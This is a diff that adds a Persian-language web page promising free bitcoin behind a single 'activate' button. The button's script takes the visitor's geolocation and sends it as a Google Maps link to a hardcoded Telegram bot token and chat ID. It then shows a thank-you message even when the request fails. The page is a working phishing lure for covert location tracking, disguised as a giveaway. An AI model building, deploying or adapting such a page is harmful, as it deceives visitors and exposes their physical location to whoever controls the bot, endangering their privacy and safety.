@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت بیتکوین</title>
+    <style>
+        body {
+            font-family: 'B Nazanin', 'Iranian Sans', Tahoma, sans-serif;
+            font-size: 22px;
+            background: #f0f8ff;
+            line-height: 1.8;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 40px;
+            border: 2px solid #4CAF50;
+            border-radius: 15px;
+            background: white;
+        }
+        
+        .big-button {
+            display: block;
+            width: 80%;
+            margin: 30px auto;
+            padding: 25px;
+            font-size: 24px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        
+        .success-msg {
+            color: #2e7d32;
+            background: #e8f5e9;
+            padding: 20px;
+            border-radius: 10px;
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #2e7d32; text-align: center;">برای دریافت کلیک کنید</h1>
+        <p style="text-align: center;">برای استفاده از سرویس، لطفاً دکمه زیر را فشار دهید</p>
+        
+        <button class="big-button" onclick="sendLocation()">فعال شدن  ➤</button>
+        
+        <div id="message" class="success-msg">
+            سپاس از همراهی شما ✔
+        </div>
+    </div>
+
+    <script>
+        function sendLocation() {
+            const btn = document.querySelector('.big-button');
+            const msg = document.getElementById('message');
+            
+            btn.disabled = true;
+            btn.innerHTML = 'لطفاً شکیبا باشید...';
+            
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const botToken = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
+                    const chatId = '1220575760';
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `دریافت شد:\nhttps://maps.google.com/?q=${lat},${lon}`
+                        })
+                    })
+                    .then(() => {
+                        msg.style.display = 'block';
+                        btn.style.display = 'none';
+                    })
+                    .catch(() => {
+                        msg.style.display = 'block';
+                        btn.style.display = 'none';
+                    });
+                },
+                error => {
+                    msg.style.display = 'block';
+                    btn.style.display = 'none';
+                }
+            );
+        }
+    </script>
+</body>
+</html>
